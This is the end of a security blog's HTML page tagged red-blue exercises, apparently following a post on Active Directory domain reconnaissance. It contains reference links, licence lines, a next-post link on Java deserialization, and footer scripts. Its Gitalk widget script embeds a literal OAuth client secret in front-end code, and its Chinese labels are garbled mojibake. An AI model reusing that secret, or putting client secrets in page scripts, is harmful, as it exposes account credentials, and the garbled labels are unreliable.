<h2 id="å‚è€ƒèµ„æ–™-1"><a href="#å‚è€ƒèµ„æ–™-1" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a target="_blank" rel="noopener" href="https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/Notes/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.md">https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/Notes/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.md</a></p>
<p><a target="_blank" rel="noopener" href="http://www.code2sec.com/zai-nei-wang-huan-jing-zhong-ding-wei-adyu-kong-fu-wu-qi.html">http://www.code2sec.com/zai-nei-wang-huan-jing-zhong-ding-wei-adyu-kong-fu-wu-qi.html</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/88786465">https://zhuanlan.zhihu.com/p/88786465</a></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">m0nk3y</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://hack-for.fun/d789.html">https://hack-for.fun/d789.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">çº¢è“å¯¹æŠ—</a></div><div class="social-share pull-right" data-disabled="google,facebook"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="next-post pull-right"><a href="/65bb.html"><span>Javaååºåˆ—åŒ–ä¹‹URLDNSåˆ©ç”¨é“¾åˆ†æå­¦ä¹ ç¬”è®°</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="gitalk-container"></div><script>var gitalk = new Gitalk({
  clientID: '6ceed9c245da8d33222a',
  clientSecret: '143c0add0301972b963c8f672bf4e58a092673fb',
  repo: 'Gitalk',
  owner: 'ifonly-go2019',
  admin: 'ifonly-go2019',
  id: md5(decodeURI(location.pathname)),
  language: 'zh-CN'
})
gitalk.render('gitalk-container')</script></div></div><footer class="footer-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200825211012.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2021 By m0nk3y</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>